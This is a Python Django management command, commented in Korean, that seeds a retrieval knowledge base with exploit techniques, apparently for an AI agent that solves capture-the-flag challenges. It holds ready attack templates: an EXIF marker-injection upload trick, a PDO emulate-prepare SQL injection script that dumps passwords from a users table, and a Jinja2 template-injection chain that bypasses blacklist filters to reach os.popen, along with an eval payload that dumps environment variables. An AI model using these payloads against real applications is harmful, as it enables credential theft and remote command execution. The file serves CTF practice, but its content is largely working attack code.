"""Exploit technique seed — *문제별 박제가 아니라 transferable trick* 형태.

각 technique은 PayloadPattern (source='technique') 한 행 + attack_metadata에 표준 schema.
schema 정의/추가 가이드는 agent/eval/KB_SCHEMA.md.

사용:
  docker compose exec backend python manage.py seed_techniques
  docker compose exec backend python manage.py seed_techniques --reset
"""
from __future__ import annotations

from django.core.management.base import BaseCommand
from django.db import transaction

from api.embedding_service import (
    EMBEDDING_MODEL,
    embed_documents,
    is_available as embeddings_available,
)
from api.models import PayloadPattern, VulnerabilityEntry


# ── Technique 정의 ────────────────────────────────────────────
# 각 entry = 하나의 일반화된 trick.
# attack_metadata schema (KB_SCHEMA.md의 표준):
#   {
#     "kind": "exploit_technique",
#     "name": str,                    # human-readable
#     "applies_when": str,             # 코드/응답에서 어떤 조건 보이면 적용 가능
#     "prerequisites": [str, ...],     # 필요 조건 리스트
#     "technique_steps_md": str,       # markdown step-by-step
#     "code_template": str,            # parametrized payload template
#     "examples": [                    # known applications
#       {"problem_id", "captured_flag", "params": {...}, "notes"}
#     ],
#     "tags": [str, ...],
#   }

TECHNIQUES: list[dict] = [
    {
        "name": "exif_passthrough_marker",
        "vuln_type": "file_upload_quirk",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["exif", "image", "passthrough", "marker"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "EXIF passthrough — binary marker + JSON payload",
            "applies_when": (
                "서버가 업로드된 JPEG의 EXIF에서 `b\"<MARKER>\\x00\"` 같은 magic byte를 검색하고 "
                "그 다음 바이트를 JSON으로 parse하는 경우 (combination, 또는 metadata 검사 류 모든 문제)"
            ),
            "prerequisites": [
                "서버가 piexif/PIL로 EXIF 처리 — 표준 EXIF tag만 dump",
                "raw bytes append (img.info['exif']) 는 PIL save에서 떨어짐",
                "MakerNote(0x927C) 또는 UserComment(0x9286) 는 Exif IFD 표준 자유 binary tag",
            ],
            "technique_steps_md": (
                "1. piexif.load(image_exif) → exif_dict\n"
                "2. exif_dict['Exif'][piexif.ExifIFD.MakerNote] = b'<MARKER>\\x00<JSON>'\n"
                "   또는 piexif.ExifIFD.UserComment 사용 (둘 다 자유 binary)\n"
                "3. piexif.dump(exif_dict) → exif_bytes\n"
                "4. img.save(out, format='JPEG', exif=exif_bytes)\n"
                "5. 서버는 exif_data.find(b'<MARKER>\\x00') + len → JSON parse 통과"
            ),
            "code_template": (
                "import io, piexif\n"
                "from PIL import Image\n"
                "img = Image.new('RGB', (100,100), {color})\n"
                "buf = io.BytesIO(); img.save(buf, format='JPEG')\n"
                "exif_dict = piexif.load(buf.getvalue())\n"
                "exif_dict['Exif'][piexif.ExifIFD.MakerNote] = b'{marker}\\x00' + {json_bytes}\n"
                "out = io.BytesIO()\n"
                "Image.open(io.BytesIO(buf.getvalue())).save(out, format='JPEG',\n"
                "                                            exif=piexif.dump(exif_dict))"
            ),
            "examples": [
                {
                    "problem_id": "2024-combination",
                    "captured_flag": "codegate2024{test}",
                    "params": {
                        "marker": "CODEGATE2024",
                        "json_bytes": "b'{}'",
                        "tag_used": "MakerNote",
                    },
                    "notes": (
                        "공식 정답은 UserComment 사용. 둘 다 동일 효과 — 서버 verify는 "
                        "img.info['exif'] 전체 bytes에서 marker 검색."
                    ),
                },
            ],
            "tags": ["exif", "passthrough", "image_upload"],
        },
    },
    {
        "name": "pdo_emulate_prepare_question_mark_smuggling",
        "vuln_type": "sqli",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["sqli", "pdo", "emulate-prepare", "identifier-injection"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "PDO emulate-prepare `?` smuggling — column/identifier injection",
            "applies_when": (
                "PHP PDO MySQL backend가 emulate prepare 모드(default `PDO::ATTR_EMULATE_PREPARES=true`)"
                "이고, prepared statement의 SQL string 일부에 사용자 입력이 동적 concat되어 추가 `?` "
                "토큰을 만들 수 있는 경우. 정상적으로 column/identifier/table name 위치에 입력이 "
                "들어가지만, 그 안에 `?` 한 개를 박으면 client-side prepare가 다른 placeholder로 인식 "
                "→ WHERE 절의 `?` 가 unbound로 밀려나고 우리 입력이 그 자리로 들어감."
            ),
            "prerequisites": [
                "PDO + MySQL (다른 backend에서는 server-side prepare로 무효)",
                "ATTR_EMULATE_PREPARES=true (PDO MySQL 기본값)",
                "동적 concat된 부분이 backtick으로 감싸지지 않거나, 감싸졌어도 input이 backtick 포함",
                "execute([single_value]) 같이 placeholder 1개만 바인드하는 호출 패턴",
            ],
            "technique_steps_md": (
                "1. 식별: `prepare(\"SELECT $col_param FROM t WHERE x = ?\"); execute([input])` 패턴\n"
                "2. col_param 에 `\\?#\\x00` 같은 가짜 column name + `?` + comment + null byte 박음\n"
                "   → SQL: `SELECT \\?#\\0 FROM t WHERE x = ?` (총 ? 2개)\n"
                "3. PDO emulate prepare가 첫 `?` 를 input 으로 string 치환:\n"
                "   `SELECT \\<input_value>#\\0 FROM t WHERE x = ?`\n"
                "4. input 안에 backtick 으로 column 닫고 임의 SELECT subquery 삽입 + `;#` 으로 뒤 SQL 주석 처리\n"
                "5. response: 결과를 column-display 안 거치고 `array_values($row)` (CSV/JSON dump) 로 받기"
            ),
            "code_template": (
                "import requests\n"
                "s = requests.Session()\n"
                "s.post(f'{TARGET}/login.php', data={{'username': USER, 'password': PW}})\n"
                "r = s.get(f'{TARGET}/index.php', params={{\n"
                "    'col': '\\\\?#\\x00',\n"
                "    'name': \"x` FROM (SELECT {leak_column} AS `'x` FROM {leak_table})y;#\",\n"
                "    'download': '1',  # array_values dump 가 가장 robust\n"
                "}})\nprint(r.text)  # CSV: 한 줄당 한 row"
            ),
            "examples": [
                {
                    "problem_id": "2026-erp-system",
                    "captured_flag": None,
                    "params": {
                        "leak_column": "password",
                        "leak_table": "users",
                        "extracted": "FAKE_PASSWORD (admin) + erp123 × 10 (사원)",
                        "post_exploit": "admin login → Stage 2 (PHP filter chain SSRF) — 외부 server 필요, scope 밖",
                    },
                    "notes": (
                        "ref: slcyber.io PDO 연구. CSV download 옵션이 column-name 매핑 우회에 유용 — "
                        "displayColumns 가 colParam 로만 결정되므로 HTML table은 `-` 로 표시되지만 "
                        "?download=1 의 array_values 는 실제 SELECT 결과를 그대로 dump."
                    ),
                },
            ],
            "tags": ["sqli", "pdo", "emulate-prepare", "identifier-injection"],
        },
    },
    {
        "name": "safe_eval_attribute_chain",
        "vuln_type": "code_injection",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["eval", "ssti", "attribute-chain", "filter-bypass"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "safe_eval / Jinja2 attribute chain — filter bypass",
            "applies_when": (
                "사용자 입력이 eval() / safe_eval() / render_template_string() 같은 sink에 전달되며 "
                "allowed_globals 또는 Jinja2 환경에 os/__builtins__/__class__/__mro__ 류가 노출. "
                "BLACKLIST 필터(`(`, `)`, `__`, `os`, `import` 등)가 있어도 attribute access "
                "(`a.b.c`), Jinja2 `attr()` filter, `~` 문자열 결합, 표준 dict access로 우회 가능."
            ),
            "prerequisites": [
                "input이 attribute access (`a.b`) 형태 가능한 sink",
                "결과가 응답 본문/error/debug에 노출되거나 또는 side-effect (file read, OOB) 가능",
                "필터 우회: '(' 차단 시 dict comprehension 또는 standard data access "
                "(`os.environ`, `request.application.__globals__`)",
                "Jinja2의 경우 `cycler|attr('_'~'_'~'init'~'_'~'_')|attr('_'~'_'~'globals'~'_'~'_')` 식 chain",
            ],
            "technique_steps_md": (
                "1. sink 식별: `eval(value)`, `safe_eval(value)`, `{{ value }}` (Jinja2 SSTI)\n"
                "2. allowed_globals/builtins/class chain 매핑:\n"
                "   - Python eval: `os.environ` (가장 단순), `__builtins__.eval`, "
                "`().__class__.__mro__[1].__subclasses__()`\n"
                "   - Jinja2: `cycler|attr('__init__')|attr('__globals__')|...` 또는 "
                "`config.from_object`, `request.application.__globals__`\n"
                "3. 필터 통과: '(' 금지면 dict access — `os.environ` 자체가 dict이므로 호출 불필요\n"
                "4. 출력: 응답 body의 debug/error/template render 결과에서 추출"
            ),
            "code_template": (
                "# Python eval/safe_eval (combination 류)\n"
                "payload = {expr}  # 예: 'os.environ'\n\n"
                "# Jinja2 SSTI BLACKLIST 우회 (censored 류)\n"
                "payload = '{{ cycler|attr(\"_~_~init~_~_\".replace(\"~\",\"\"))'\n"
                "          '|attr(\"_~_~globals~_~_\".replace(\"~\",\"\"))'\n"
                "          '|attr(\"get\")(\"o~s\".replace(\"~\",\"\"))'\n"
                "          '|attr(\"po~pen\".replace(\"~\",\"\"))(\"<cmd>\")'\n"
                "          '|attr(\"re~ad\".replace(\"~\",\"\"))() }}'"
            ),
            "examples": [
                {
                    "problem_id": "2024-combination",
                    "captured_flag": "codegate2024{test}",
                    "params": {
                        "sink": "safe_eval (Python)",
                        "expr": "os.environ",
                        "filter_bypassed": ["( 차단", ") 차단", "domain regex 통과 필요"],
                        "output_path": "TRACE /verify response debug field",
                    },
                    "notes": "ImageDescription tag → safe_eval → dict(os.environ) → FLAG env 노출",
                },
                {
                    "problem_id": "2025-censored-board",
                    "captured_flag": None,
                    "params": {
                        "sink": "Jinja2 render_template_string",
                        "expr": "cycler|attr ... chain → os.popen(timing payload)",
                        "filter_bypassed": [
                            "BLACKLIST: __ . [ ] + request config os subprocess "
                            "import init globals open read mro class",
                        ],
                        "output_path": "time-based blind (iptables outgoing DROP)",
                    },
                    "notes": "OOB 불가, 응답 시간 측정으로 한 글자씩",
                },
            ],
            "tags": ["eval", "ssti", "attribute-chain", "filter-bypass"],
        },
    },
]


class Command(BaseCommand):
    help = "Seed exploit techniques (transferable tricks, kind='exploit_technique')"

    def add_arguments(self, parser):
        parser.add_argument(
            "--reset", action="store_true",
            help="기존 source='technique' 모두 삭제 후 재시드",
        )

    @transaction.atomic
    def handle(self, *args, **opts):
        if opts.get("reset"):
            deleted = PayloadPattern.objects.filter(source="technique").delete()
            self.stdout.write(self.style.WARNING(f"reset: deleted {deleted}"))

        created_cnt = 0
        updated_cnt = 0
        for t in TECHNIQUES:
            obj, created = PayloadPattern.objects.update_or_create(
                name=t["name"],
                source="technique",
                defaults={
                    "vuln_type": t["vuln_type"],
                    "category": t.get("category", "exploitation"),
                    "safety_level": t.get("safety_level", "safe"),
                    "request_template": "",  # technique은 단일 payload 아님
                    "matcher": None,
                    "safety_notes": t["attack_metadata"].get("applies_when", "")[:500],
                    "tags": t.get("tags", []),
                    "attack_metadata": t["attack_metadata"],
                    "is_active": True,
                },
            )
            self.stdout.write(
                f"  technique {'+' if created else '='} {t['name']:40s} ({t['vuln_type']})"
            )
            if created:
                created_cnt += 1
            else:
                updated_cnt += 1

        self.stdout.write(self.style.SUCCESS(
            f"\ntechniques: +{created_cnt} created, ={updated_cnt} updated"
        ))

        # 임베딩 — search_knowledge / retrieve_similar_patterns 가 hit
        if embeddings_available():
            from api.embedding_service import pattern_text
            targets = list(PayloadPattern.objects.filter(source="technique"))
            texts = []
            for p in targets:
                # technique은 attack_metadata 본문이 더 풍부 — 그것 위주로 임베딩
                meta = p.attack_metadata or {}
                parts = [
                    f"name: {meta.get('name', p.name)}",
                    f"vuln_type: {p.vuln_type}",
                    f"applies_when: {meta.get('applies_when', '')}",
                    f"prerequisites: {' / '.join(meta.get('prerequisites') or [])}",
                    f"steps: {meta.get('technique_steps_md', '')[:500]}",
                    f"tags: {', '.join(meta.get('tags') or p.tags or [])}",
                ]
                texts.append("\n".join(parts))
            self.stdout.write(f"embedding {len(texts)} techniques via {EMBEDDING_MODEL} ...")
            vectors = embed_documents(texts)
            if vectors:
                for p, vec in zip(targets, vectors):
                    p.embedding = vec
                    p.embedding_model = EMBEDDING_MODEL
                    p.save(update_fields=["embedding", "embedding_model"])
                self.stdout.write(self.style.SUCCESS(
                    f"embeddings saved for {len(vectors)} techniques"
                ))
            else:
                self.stdout.write(self.style.WARNING("임베딩 생성 실패 — 건너뜀"))
        else:
            self.stdout.write(self.style.WARNING(
                "Voyage 임베딩 비활성: VOYAGE_API_KEY 미설정 — semantic 검색 빈 결과"
            ))
